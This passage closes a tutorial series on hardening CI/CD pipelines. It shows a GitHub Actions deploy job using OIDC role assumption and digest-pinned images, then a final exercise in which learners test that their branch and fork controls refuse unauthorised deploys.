      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}   # sub pinned to this env
          aws-region: ${{ vars.AWS_REGION }}

      - name: Deploy by immutable digest
        run: |
          ./deploy.sh --image "ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}"

      - name: Record the deployment
        if: always()
        run: |
          {
            echo "### Deployed"
            echo "- commit: \`${{ github.sha }}\`"
            echo "- digest: \`${{ needs.image.outputs.digest }}\`"
            echo "- by: @${{ github.actor }}"
          } >> "$GITHUB_STEP_SUMMARY"
```

<div class="guide-try">
  <span class="ct">Try it: the final exercise</span>
  <ol>
    <li>Build this pipeline end to end on a real project: reusable CI, an image built with provenance, and an OIDC deploy behind an environment.</li>
    <li>Verify each control actively: try to deploy from a non-<code>main</code> branch, try to push an image from a fork pull request, and try to assume the deploy role from a throwaway branch.</li>
    <li>Confirm the deployed reference is a digest, not a tag.</li>
    <li>Then hand it to a colleague and ask them to run the review checklist against it.</li>
  </ol>
  <em>three refusals and one green deploy. A control you have never seen refuse anything is decoration. This exercise is the difference between a pipeline that looks hardened and one that is.</em>
</div>

## Where the series leaves you

Across the three levels you have gone from a first green run to owning CI/CD as a platform. The same topics carried all the way through, each time with more depth:

<div class="flow">
  <div class="node">BEGINNER<small>make it work</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">MID<small>make it fast and reusable</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">SENIOR<small>make it safe and scalable</small></div>
</div>

You should now be able to look at any workflow and see not just what it does but what it *permits*: which triggers give fork-influenced code a privileged token, what that token can reach, whether event data flows into a shell, whether third-party code is pinned, whether a credential could reach a log, and whether there is an automated path to production without a human in it.

That review instinct is what you take with you.
